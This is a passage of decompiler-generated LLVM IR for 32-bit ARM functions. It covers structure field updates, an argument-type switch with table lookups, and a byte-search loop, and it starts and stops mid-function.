  uselistorder i32 %v0_dd34.pre, { 1, 0 }
  uselistorder i32 %v6_dd00, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_dd80, { 1, 0 }
  uselistorder label %dec_label_pc_dd50, { 1, 0 }
  uselistorder label %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge, { 1, 0 }
}

define i32 @function_dd98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_dd98:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_dd98 = load i32, i32* @r4, align 4
  store i32 %v3_dd98, i32* %stack_var_-12, align 4
  %v1_dd9c = add i32 %arg1, 24
  %v2_dd9c = inttoptr i32 %v1_dd9c to i32*
  %v3_dd9c = load i32, i32* %v2_dd9c, align 4
  store i32 %v3_dd9c, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_ddac = add i32 %arg1, 76
  %v3_ddac = inttoptr i32 %v2_ddac to i32*
  store i32 %arg2, i32* %v3_ddac, align 4
  %v7_ddb0 = icmp sgt i32 %v3_dd9c, 0
  br i1 %v7_ddb0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_dd98
  %v10_ddb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_ddb0, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %dec_label_pc_dd98
  %v0_ddb4 = load i32, i32* %r3.global-to-local, align 4
  %v2_ddb4 = add i32 %arg1, 8
  %v3_ddb4 = inttoptr i32 %v2_ddb4 to i32*
  store i32 %v0_ddb4, i32* %v3_ddb4, align 4
  %v0_ddb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_ddb8 = add i32 %arg1, 28
  %v3_ddb8 = inttoptr i32 %v2_ddb8 to i32*
  store i32 %v0_ddb8, i32* %v3_ddb8, align 4
  %v0_ddbc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ddbc, i32* %v2_dd9c, align 4
  %v0_ddc0 = load i32, i32* %r3.global-to-local, align 4
  %v2_ddc0 = add i32 %arg1, 4
  %v3_ddc0 = inttoptr i32 %v2_ddc0 to i32*
  store i32 %v0_ddc0, i32* %v3_ddc0, align 4
  %v0_ddc4 = call i32 @function_ddd0()
  %v0_ddc8 = load i32, i32* %r5.global-to-local, align 4
  %v1_ddc8 = load i32, i32* @r4, align 4
  %v2_ddc8 = add i32 %v1_ddc8, 24
  %v3_ddc8 = inttoptr i32 %v2_ddc8 to i32*
  store i32 %v0_ddc8, i32* %v3_ddc8, align 4
  %v2_ddcc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ddcc, i32* @r4, align 4
  ret i32 %v0_ddc4

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_ddd0, { 1, 0 }
  uselistorder i32 %arg1, { 0, 5, 6, 4, 2, 1, 3, 7 }
}

define i32 @function_ddd0() local_unnamed_addr {
dec_label_pc_ddd0:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_ddd0 = load i32, i32* @r0, align 4
  %v1_ddd0 = add i32 %v0_ddd0, 24
  %v2_ddd0 = inttoptr i32 %v1_ddd0 to i32*
  %v3_ddd0 = load i32, i32* %v2_ddd0, align 4
  store i32 %v3_ddd0, i32* %r1.global-to-local, align 4
  %v2_ddd4 = icmp eq i32 %v3_ddd0, 0
  %v3_ddd8 = load i32, i32* @r4, align 4
  store i32 %v3_ddd8, i32* %stack_var_-8, align 4
  %v1_dddc = add i32 %v0_ddd0, 80
  store i32 %v1_dddc, i32* %ip.global-to-local, align 4
  %v1_dde0 = add i32 %v0_ddd0, 8
  %v2_dde0 = inttoptr i32 %v1_dde0 to i32*
  %v3_dde0 = load i32, i32* %v2_dde0, align 4
  store i32 %v3_dde0, i32* %r3.global-to-local, align 4
  %v6_dde8 = icmp eq i32 %v3_dde0, -2147483648
  br i1 %v2_ddd4, label %dec_label_pc_dde8, label %dec_label_pc_df0c

dec_label_pc_dde8:                                ; preds = %dec_label_pc_ddd0
  br i1 %v6_dde8, label %dec_label_pc_ddf0, label %dec_label_pc_de08

dec_label_pc_ddf0:                                ; preds = %dec_label_pc_dde8
  %v1_ddf0 = add i32 %v0_ddd0, 76
  %v2_ddf0 = inttoptr i32 %v1_ddf0 to i32*
  %v3_ddf0 = load i32, i32* %v2_ddf0, align 4
  store i32 %v3_ddf0, i32* %r3.global-to-local, align 4
  %v1_ddf4 = inttoptr i32 %v3_ddf0 to i32*
  %v2_ddf4 = load i32, i32* %v1_ddf4, align 4
  store i32 %v2_ddf4, i32* %r2.global-to-local, align 4
  %v1_ddf8 = add i32 %v3_ddf0, 4
  store i32 %v1_ddf8, i32* %r3.global-to-local, align 4
  store i32 %v1_ddf8, i32* %v2_ddf0, align 4
  %v0_de00 = load i32, i32* %r2.global-to-local, align 4
  %v1_de00 = load i32, i32* @r0, align 4
  %v2_de00 = add i32 %v1_de00, 8
  %v3_de00 = inttoptr i32 %v2_de00 to i32*
  store i32 %v0_de00, i32* %v3_de00, align 4
  %v0_de04 = load i32, i32* %r2.global-to-local, align 4
  %v1_de04 = load i32, i32* @r0, align 4
  %v2_de04 = add i32 %v1_de04, 80
  %v3_de04 = inttoptr i32 %v2_de04 to i32*
  store i32 %v0_de04, i32* %v3_de04, align 4
  %v0_de08.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_de08

dec_label_pc_de08:                                ; preds = %dec_label_pc_dde8, %dec_label_pc_ddf0
  %v1_de20 = phi i32 [ %v0_ddd0, %dec_label_pc_dde8 ], [ %v0_de08.pre, %dec_label_pc_ddf0 ]
  %v1_de08 = add i32 %v1_de20, 4
  %v2_de08 = inttoptr i32 %v1_de08 to i32*
  %v3_de08 = load i32, i32* %v2_de08, align 4
  store i32 %v3_de08, i32* %r3.global-to-local, align 4
  %v6_de0c = icmp eq i32 %v3_de08, -2147483648
  br i1 %v6_de0c, label %dec_label_pc_de14, label %dec_label_pc_de2c

dec_label_pc_de14:                                ; preds = %dec_label_pc_de08
  %v1_de14 = add i32 %v1_de20, 76
  %v2_de14 = inttoptr i32 %v1_de14 to i32*
  %v3_de14 = load i32, i32* %v2_de14, align 4
  store i32 %v3_de14, i32* %r3.global-to-local, align 4
  %v1_de18 = inttoptr i32 %v3_de14 to i32*
  %v2_de18 = load i32, i32* %v1_de18, align 4
  store i32 %v2_de18, i32* %r2.global-to-local, align 4
  %v1_de1c = add i32 %v3_de14, 4
  store i32 %v1_de1c, i32* %r3.global-to-local, align 4
  store i32 %v1_de1c, i32* %v2_de14, align 4
  %v0_de24 = load i32, i32* %r2.global-to-local, align 4
  %v1_de24 = load i32, i32* @r0, align 4
  %v2_de24 = add i32 %v1_de24, 4
  %v3_de24 = inttoptr i32 %v2_de24 to i32*
  store i32 %v0_de24, i32* %v3_de24, align 4
  %v0_de28 = load i32, i32* %r2.global-to-local, align 4
  %v1_de28 = load i32, i32* @r0, align 4
  %v2_de28 = add i32 %v1_de28, 80
  %v3_de28 = inttoptr i32 %v2_de28 to i32*
  store i32 %v0_de28, i32* %v3_de28, align 4
  %v0_defc18.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_de2c

dec_label_pc_de2c:                                ; preds = %dec_label_pc_de08, %dec_label_pc_de14
  %v0_defc18 = phi i32 [ %v1_de20, %dec_label_pc_de08 ], [ %v0_defc18.pre, %dec_label_pc_de14 ]
  %v0_de2c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_de2c, i32* @lr, align 4
  %v1_defc19 = add i32 %v0_defc18, 28
  %v2_defc20 = inttoptr i32 %v1_defc19 to i32*
  %v3_defc21 = load i32, i32* %v2_defc20, align 4
  store i32 %v3_defc21, i32* %r3.global-to-local, align 4
  %v5_df0423 = icmp slt i32 %v0_de2c, %v3_defc21
  br i1 %v5_df0423, label %dec_label_pc_de34, label %dec_label_pc_df08.loopexit

dec_label_pc_de34:                                ; preds = %dec_label_pc_de2c, %dec_label_pc_def8
  %v0_defc25 = phi i32 [ %v0_defc, %dec_label_pc_def8 ], [ %v0_defc18, %dec_label_pc_de2c ]
  %v1_de3424 = phi i32 [ %v1_def8, %dec_label_pc_def8 ], [ %v0_de2c, %dec_label_pc_de2c ]
  %v4_de34 = mul i32 %v1_de3424, 4
  %v5_de34 = add i32 %v0_defc25, %v4_de34
  store i32 %v5_de34, i32* %r3.global-to-local, align 4
  %v1_de38 = add i32 %v5_de34, 40
  %v2_de38 = inttoptr i32 %v1_de38 to i32*
  %v3_de38 = load i32, i32* %v2_de38, align 4
  store i32 %v3_de38, i32* %r2.global-to-local, align 4
  %v7_de3c = icmp eq i32 %v3_de38, 8
  br i1 %v7_de3c, label %dec_label_pc_def8, label %dec_label_pc_de44

dec_label_pc_de44:                                ; preds = %dec_label_pc_de34
  %v1_de44 = add i32 %v0_defc25, 76
  %v2_de44 = inttoptr i32 %v1_de44 to i32*
  %v3_de44 = load i32, i32* %v2_de44, align 4
  store i32 %v3_de44, i32* %r1.global-to-local, align 4
  %v8_de48 = icmp sgt i32 %v3_de38, 8
  br i1 %v8_de48, label %dec_label_pc_de6c, label %dec_label_pc_de4c

dec_label_pc_de4c:                                ; preds = %dec_label_pc_de44
  %v7_de4c = icmp eq i32 %v3_de38, 2
  br i1 %v7_de4c, label %dec_label_pc_deb8, label %dec_label_pc_de54

dec_label_pc_de54:                                ; preds = %dec_label_pc_de4c
  %v8_de54 = icmp sgt i32 %v3_de38, 2
  br i1 %v8_de54, label %dec_label_pc_de64, label %dec_label_pc_de58

dec_label_pc_de58:                                ; preds = %dec_label_pc_de54
  %v1_de58 = icmp slt i32 %v3_de38, 0
  br i1 %v1_de58, label %dec_label_pc_dee4, label %dec_label_pc_deb8

dec_label_pc_de64:                                ; preds = %dec_label_pc_de54
  %v7_de64 = icmp eq i32 %v3_de38, 7
  br i1 %v7_de64, label %dec_label_pc_decc, label %dec_label_pc_dee4

dec_label_pc_de6c:                                ; preds = %dec_label_pc_de44
  %v7_de6c = icmp eq i32 %v3_de38, 1024
  br i1 %v7_de6c, label %dec_label_pc_deb8, label %dec_label_pc_de74

dec_label_pc_de74:                                ; preds = %dec_label_pc_de6c
  %v8_de74 = icmp sgt i32 %v3_de38, 1024
  br i1 %v8_de74, label %dec_label_pc_de8c, label %dec_label_pc_de78

dec_label_pc_de78:                                ; preds = %dec_label_pc_de74
  switch i32 %v3_de38, label %dec_label_pc_dee4 [
    i32 256, label %dec_label_pc_deb8
    i32 512, label %dec_label_pc_deb8
  ]

dec_label_pc_de8c:                                ; preds = %dec_label_pc_de74
  %v7_de8c = icmp eq i32 %v3_de38, 2048
  br i1 %v7_de8c, label %dec_label_pc_dea4, label %dec_label_pc_de9c

dec_label_pc_de9c:                                ; preds = %dec_label_pc_de8c
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_de98 = icmp eq i32 %v3_de38, 2055
  br i1 %v9_de98, label %dec_label_pc_decc, label %dec_label_pc_dee4

dec_label_pc_dea4:                                ; preds = %dec_label_pc_de8c
  %v1_dea4 = add i32 %v3_de44, 8
  store i32 %v1_dea4, i32* %r3.global-to-local, align 4
  store i32 %v1_dea4, i32* %v2_de44, align 4
  %v0_deac = load i32, i32* %r1.global-to-local, align 4
  %v1_deac = inttoptr i32 %v0_deac to i32*
  %v2_deac = load i32, i32* %v1_deac, align 4
  store i32 %v2_deac, i32* %r3.global-to-local, align 4
  %v3_deac = add i32 %v0_deac, 4
  %v4_deac = inttoptr i32 %v3_deac to i32*
  %v5_deac = load i32, i32* %v4_deac, align 4
  store i32 %v5_deac, i32* %r4.global-to-local, align 4
  %v0_deb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_deb0 = inttoptr i32 %v0_deb0 to i32*
  store i32 %v2_deac, i32* %v1_deb0, align 4
  %v3_deb0 = add i32 %v0_deb0, 4
  %v4_deb0 = inttoptr i32 %v3_deb0 to i32*
  %v5_deb0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_deb0, i32* %v4_deb0, align 4
  br label %dec_label_pc_def4

dec_label_pc_deb8:                                ; preds = %dec_label_pc_de78, %dec_label_pc_de78, %dec_label_pc_de58, %dec_label_pc_de6c, %dec_label_pc_de4c
  %v1_deb8 = inttoptr i32 %v3_de44 to i32*
  %v2_deb8 = load i32, i32* %v1_deb8, align 4
  store i32 %v2_deb8, i32* %r2.global-to-local, align 4
  %v1_debc = add i32 %v3_de44, 4
  store i32 %v1_debc, i32* %r3.global-to-local, align 4
  store i32 %v1_debc, i32* %v2_de44, align 4
  %v0_dec4 = load i32, i32* %r2.global-to-local, align 4
  %v1_dec4 = load i32, i32* %ip.global-to-local, align 4
  %v2_dec4 = inttoptr i32 %v1_dec4 to i32*
  store i32 %v0_dec4, i32* %v2_dec4, align 4
  br label %dec_label_pc_def4

dec_label_pc_decc:                                ; preds = %dec_label_pc_de64, %dec_label_pc_de9c
  %v3_decc = load i32, i32* %v2_de44, align 4
  store i32 %v3_decc, i32* %r3.global-to-local, align 4
  %v1_ded0 = inttoptr i32 %v3_decc to i32*
  %v2_ded0 = load i32, i32* %v1_ded0, align 4
  store i32 %v2_ded0, i32* %r1.global-to-local, align 4
  %v3_ded0 = add i32 %v3_decc, 4
  %v4_ded0 = inttoptr i32 %v3_ded0 to i32*
  %v5_ded0 = load i32, i32* %v4_ded0, align 4
  store i32 %v5_ded0, i32* %r2.global-to-local, align 4
  %v1_ded4 = add i32 %v3_decc, 8
  store i32 %v1_ded4, i32* %r3.global-to-local, align 4
  store i32 %v1_ded4, i32* %v2_de44, align 4
  %v0_dedc = load i32, i32* %ip.global-to-local, align 4
  %v1_dedc = inttoptr i32 %v0_dedc to i32*
  %v2_dedc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_dedc, i32* %v1_dedc, align 4
  %v3_dedc = add i32 %v0_dedc, 4
  %v4_dedc = inttoptr i32 %v3_dedc to i32*
  %v5_dedc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_dedc, i32* %v4_dedc, align 4
  br label %dec_label_pc_def4

dec_label_pc_dee4:                                ; preds = %dec_label_pc_de78, %dec_label_pc_de64, %dec_label_pc_de58, %dec_label_pc_de9c
  %v1_dee4 = add i32 %v3_de44, 4
  store i32 %v1_dee4, i32* %r3.global-to-local, align 4
  store i32 %v1_dee4, i32* %v2_de44, align 4
  %v0_deec = load i32, i32* %r1.global-to-local, align 4
  %v1_deec = inttoptr i32 %v0_deec to i32*
  %v2_deec = load i32, i32* %v1_deec, align 4
  store i32 %v2_deec, i32* %r3.global-to-local, align 4
  %v1_def0 = load i32, i32* %ip.global-to-local, align 4
  %v2_def0 = inttoptr i32 %v1_def0 to i32*
  store i32 %v2_deec, i32* %v2_def0, align 4
  br label %dec_label_pc_def4

dec_label_pc_def4:                                ; preds = %dec_label_pc_decc, %dec_label_pc_deb8, %dec_label_pc_dea4, %dec_label_pc_dee4
  %v0_def4 = load i32, i32* %ip.global-to-local, align 4
  %v1_def4 = add i32 %v0_def4, 8
  store i32 %v1_def4, i32* %ip.global-to-local, align 4
  %v0_def8.pre = load i32, i32* @lr, align 4
  %v0_defc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_def8

dec_label_pc_def8:                                ; preds = %dec_label_pc_de34, %dec_label_pc_def4
  %v0_defc = phi i32 [ %v0_defc25, %dec_label_pc_de34 ], [ %v0_defc.pre, %dec_label_pc_def4 ]
  %v0_def8 = phi i32 [ %v1_de3424, %dec_label_pc_de34 ], [ %v0_def8.pre, %dec_label_pc_def4 ]
  %v1_def8 = add i32 %v0_def8, 1
  store i32 %v1_def8, i32* @lr, align 4
  %v1_defc = add i32 %v0_defc, 28
  %v2_defc = inttoptr i32 %v1_defc to i32*
  %v3_defc = load i32, i32* %v2_defc, align 4
  store i32 %v3_defc, i32* %r3.global-to-local, align 4
  %v5_df04 = icmp slt i32 %v1_def8, %v3_defc
  br i1 %v5_df04, label %dec_label_pc_de34, label %dec_label_pc_defc.dec_label_pc_df08.loopexit_crit_edge

dec_label_pc_df0c:                                ; preds = %dec_label_pc_ddd0
  br i1 %v6_dde8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_df0c
  %v2_df10 = add i32 %v0_ddd0, 36
  %v3_df10 = inttoptr i32 %v2_df10 to i8*
  %v4_df10 = load i8, i8* %v3_df10, align 1
  %v5_df10 = zext i8 %v4_df10 to i32
  %v5_df14 = mul nuw nsw i32 %v5_df10, 8
  %v6_df14 = add i32 %v5_df14, %v1_dddc
  store i32 %v6_df14, i32* %r3.global-to-local, align 4
  %v2_df18 = add i32 %v6_df14, -8
  %v3_df18 = inttoptr i32 %v2_df18 to i32*
  %v4_df18 = load i32, i32* %v3_df18, align 4
  store i32 %v4_df18, i32* %r3.global-to-local, align 4
  store i32 %v4_df18, i32* %v2_dde0, align 4
  %v0_df20.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_df0c, %bb
  %v2_df34 = phi i32 [ %v0_df20.pre, %bb ], [ %v0_ddd0, %dec_label_pc_df0c ]
  %v1_df20 = add i32 %v2_df34, 4
  %v2_df20 = inttoptr i32 %v1_df20 to i32*
  %v3_df20 = load i32, i32* %v2_df20, align 4
  store i32 %v3_df20, i32* %r3.global-to-local, align 4
  %v6_df24 = icmp eq i32 %v3_df20, -2147483648
  br i1 %v6_df24, label %bb15, label %dec_label_pc_df08

bb15:                                             ; preds = %.thread2
  %v2_df28 = add i32 %v2_df34, 37
  %v3_df28 = inttoptr i32 %v2_df28 to i8*
  %v4_df28 = load i8, i8* %v3_df28, align 1
  %v5_df28 = zext i8 %v4_df28 to i32
  %v1_df2c = load i32, i32* %ip.global-to-local, align 4
  %v5_df2c = mul nuw nsw i32 %v5_df28, 8
  %v6_df2c = add i32 %v5_df2c, %v1_df2c
  store i32 %v6_df2c, i32* %r3.global-to-local, align 4
  %v2_df30 = add i32 %v6_df2c, -8
  %v3_df30 = inttoptr i32 %v2_df30 to i32*
  %v4_df30 = load i32, i32* %v3_df30, align 4
  store i32 %v4_df30, i32* %r3.global-to-local, align 4
  store i32 %v4_df30, i32* %v2_df20, align 4
  %v0_df38.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_df08

dec_label_pc_defc.dec_label_pc_df08.loopexit_crit_edge: ; preds = %dec_label_pc_def8
  br label %dec_label_pc_df08.loopexit

dec_label_pc_df08.loopexit:                       ; preds = %dec_label_pc_defc.dec_label_pc_df08.loopexit_crit_edge, %dec_label_pc_de2c
  %v0_defc.lcssa = phi i32 [ %v0_defc, %dec_label_pc_defc.dec_label_pc_df08.loopexit_crit_edge ], [ %v0_defc18, %dec_label_pc_de2c ]
  br label %dec_label_pc_df08

dec_label_pc_df08:                                ; preds = %dec_label_pc_df08.loopexit, %.thread2, %bb15
  %v1_df58 = phi i32 [ %v0_defc.lcssa, %dec_label_pc_df08.loopexit ], [ %v2_df34, %.thread2 ], [ %v0_df38.pre, %bb15 ]
  %v1_df38 = add i32 %v1_df58, 8
  %v2_df38 = inttoptr i32 %v1_df38 to i32*
  %v3_df38 = load i32, i32* %v2_df38, align 4
  store i32 %v3_df38, i32* %r1.global-to-local, align 4
  %v1_df3c = icmp slt i32 %v3_df38, 0
  br i1 %v1_df3c, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_df08
  %v5_df40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_df40, i32* @r4, align 4
  ret i32 %v1_df58

bb17:                                             ; preds = %dec_label_pc_df08
  %v1_df44 = add i32 %v1_df58, 16
  %v2_df44 = inttoptr i32 %v1_df44 to i32*
  %v3_df44 = load i32, i32* %v2_df44, align 4
  %v1_df4c = sub i32 0, %v3_df38
  store i32 %v1_df4c, i32* %r1.global-to-local, align 4
  %v1_df48 = and i32 %v3_df44, -10
  %v1_df50 = or i32 %v1_df48, 8
  store i32 %v1_df50, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_df58 = add i32 %v1_df58, 20
  %v3_df58 = inttoptr i32 %v2_df58 to i32*
  store i32 32, i32* %v3_df58, align 4
  %v0_df5c = load i32, i32* %r1.global-to-local, align 4
  %v1_df5c = load i32, i32* @r0, align 4
  %v2_df5c = add i32 %v1_df5c, 8
  %v3_df5c = inttoptr i32 %v2_df5c to i32*
  store i32 %v0_df5c, i32* %v3_df5c, align 4
  %v0_df60 = load i32, i32* %r3.global-to-local, align 4
  %v1_df60 = load i32, i32* @r0, align 4
  %v2_df60 = add i32 %v1_df60, 16
  %v3_df60 = inttoptr i32 %v2_df60 to i32*
  store i32 %v0_df60, i32* %v3_df60, align 4
  %v2_df64 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_df64, i32* @r4, align 4
  %v8_df64 = load i32, i32* @r0, align 4
  ret i32 %v8_df64

; uselistorder directives
  uselistorder i32 %v1_def8, { 2, 1, 0 }
  uselistorder i32 %v0_defc, { 1, 2, 0 }
  uselistorder i32 %v3_decc, { 0, 2, 1, 3 }
  uselistorder i32 %v3_de44, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_de44, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_de38, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_de3424, { 1, 0 }
  uselistorder i32 %v0_defc18, { 2, 0, 1 }
  uselistorder i32 %v0_ddd0, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_df08, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_def8, { 1, 0 }
  uselistorder label %dec_label_pc_def4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_dee4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_decc, { 1, 0 }
  uselistorder label %dec_label_pc_deb8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_de34, { 1, 0 }
  uselistorder label %dec_label_pc_de2c, { 1, 0 }
  uselistorder label %dec_label_pc_de08, { 1, 0 }
}

define i32 @function_df6c() local_unnamed_addr {
dec_label_pc_df6c:
  %v1_df84.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_df70

dec_label_pc_df70:                                ; preds = %dec_label_pc_df8c, %dec_label_pc_df6c
  %v0_df70 = phi i32 [ %v1_df70, %dec_label_pc_df8c ], [ ptrtoint (i32* @global_var_15dd0.343 to i32), %dec_label_pc_df6c ]
  %v1_df70 = add i32 %v0_df70, -2
  %v1_df74 = add i32 %v0_df70, -1
  %v2_df74 = inttoptr i32 %v1_df74 to i8*
  %v3_df74 = load i8, i8* %v2_df74, align 1
  %v4_df74 = zext i8 %v3_df74 to i32
  %v1_df78 = inttoptr i32 %v1_df70 to i8*
  %v2_df78 = load i8, i8* %v1_df78, align 2
  %v3_df78 = zext i8 %v2_df78 to i32
  %v3_df7c = mul nuw i32 %v4_df74, 16777216
  %v4_df80 = sdiv i32 %v3_df7c, 65536
  %v5_df80 = or i32 %v4_df80, %v3_df78
  %v9_df84 = icmp eq i32 %v5_df80, %v1_df84.pre
  br i1 %v9_df84, label %dec_label_pc_df70.dec_label_pc_df98_crit_edge, label %dec_label_pc_df8c

dec_label_pc_df70.dec_label_pc_df98_crit_edge:    ; preds = %dec_label_pc_df70
  br label %dec_label_pc_df98

dec_label_pc_df8c:                                ; preds = %dec_label_pc_df70
  %tmp = icmp ugt i32 %v1_df70, ptrtoint (i32* @global_var_15db8.345 to i32)
  br i1 %tmp, label %dec_label_pc_df70, label %dec_label_pc_df98

dec_label_pc_df98:                                ; preds = %dec_label_pc_df8c, %dec_label_pc_df70.dec_label_pc_df98_crit_edge
  %v2_dfa0.pre-phi = sub i32 %v1_df70, ptrtoint (i32* @global_var_15db8.345 to i32)
  store i32 ptrtoint (i32* @global_var_15dd0.343 to i32), i32* @r2, align 4
  %v4_dfa4 = sdiv i32 %v2_dfa0.pre-phi, 2
  %v5_dfa4 = add i32 %v4_dfa4, ptrtoint (i32* @global_var_15dd0.343 to i32)
  %v6_dfa4 = inttoptr i32 %v5_dfa4 to i8*
  %v7_dfa4 = load i8, i8* %v6_dfa4, align 1
  %v9_dfa4 = zext i8 %v7_dfa4 to i32
  ret i32 %v9_dfa4

; uselistorder directives
  uselistorder i32 %v1_df70, { 0, 1, 3, 2 }
  uselistorder i32 %v0_df70, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_15dd0.343 to i32), { 1, 2, 0 }
}

define i32 @function_dfb8(i32* %arg1) local_unnamed_addr {
dec_label_pc_dfb8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_dfb8 = load i32, i32* @r4, align 4
  store i32 %v3_dfb8, i32* %stack_var_-32, align 4
  %v6_dfb8 = load i32, i32* @r5, align 4
  %v25_dfb8 = ptrtoint i32* %stack_var_-32 to i32
  %v1_dfbc = add i32 %tmp, 16
  %v2_dfbc = inttoptr i32 %v1_dfbc to i32*
  %v3_dfbc = load i32, i32* %v2_dfbc, align 4
  %v2_dfc0 = ptrtoint i32* %stack_var_-88 to i32
  %v1_dfc4 = and i32 %v3_dfbc, 128
  store i32 %v1_dfc4, i32* @r4, align 4
  %v2_dfc4 = icmp eq i32 %v1_dfc4, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_dfe4 = add i32 %tmp, 24
  %v2_dfe4 = inttoptr i32 %v1_dfe4 to i32*
  %v3_dfe4 = load i32, i32* %v2_dfe4, align 4
  store i32 %v3_dfe4, i32* %sb.global-to-local, align 4
  br i1 %v2_dfc4, label %bb, label %dec_label_pc_e004

bb:                                               ; preds = %dec_label_pc_dfb8
  %v3_dfe8 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_e050

dec_label_pc_dff4:                                ; preds = %dec_label_pc_e1d4
  %v0_dff4 = load i32, i32* %r0.global-to-local, align 4
  %v0_e204.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e1fc

dec_label_pc_dffc:                                ; preds = %dec_label_pc_e200
  %v1_dffc = add i32 %v0_e204.pre, 1
  store i32 %v1_dffc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e21c

dec_label_pc_e004:                                ; preds = %dec_label_pc_dfb8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e008

dec_label_pc_e008:                                ; preds = %dec_label_pc_e03c.dec_label_pc_e008_crit_edge, %dec_label_pc_e004
  %v1_e018 = phi i32 [ %v1_e02c, %dec_label_pc_e03c.dec_label_pc_e008_crit_edge ], [ 0, %dec_label_pc_e004 ]
  %v0_e008 = phi i32 [ %v0_e008.pre, %dec_label_pc_e03c.dec_label_pc_e008_crit_edge ], [ %tmp, %dec_label_pc_e004 ]
  %v1_e008 = inttoptr i32 %v0_e008 to i32*
  %v2_e008 = load i32, i32* %v1_e008, align 4
  %v4_e00c = mul i32 %v1_e018, 4
  %v5_e00c = add i32 %v2_e008, %v4_e00c
  store i32 %v5_e00c, i32* %r3.global-to-local, align 4
  %v1_e010 = add i32 %v5_e00c, -4
  %v2_e010 = inttoptr i32 %v1_e010 to i32*
  %v3_e010 = load i32, i32* %v2_e010, align 4
  store i32 %v3_e010, i32* %r1.global-to-local, align 4
  store i32 %v25_dfb8, i32* @ip, align 4
  %v2_e018 = add i32 %v1_e018, %v25_dfb8
  store i32 %v2_e018, i32* %r2.global-to-local, align 4
  %v1_e01c = trunc i32 %v3_e010 to i8
  %v3_e01c = add i32 %v2_e018, -56
  %v4_e01c = inttoptr i32 %v3_e01c to i8*
  store i8 %v1_e01c, i8* %v4_e01c, align 1
  %v0_e020 = load i32, i32* %r2.global-to-local, align 4
  %v1_e020 = add i32 %v0_e020, -56
  %v2_e020 = inttoptr i32 %v1_e020 to i8*
  %v3_e020 = load i8, i8* %v2_e020, align 1
  %v4_e020 = zext i8 %v3_e020 to i32
  store i32 %v4_e020, i32* %r2.global-to-local, align 4
  %v0_e024 = load i32, i32* %r3.global-to-local, align 4
  %v1_e024 = add i32 %v0_e024, -4
  %v2_e024 = inttoptr i32 %v1_e024 to i32*
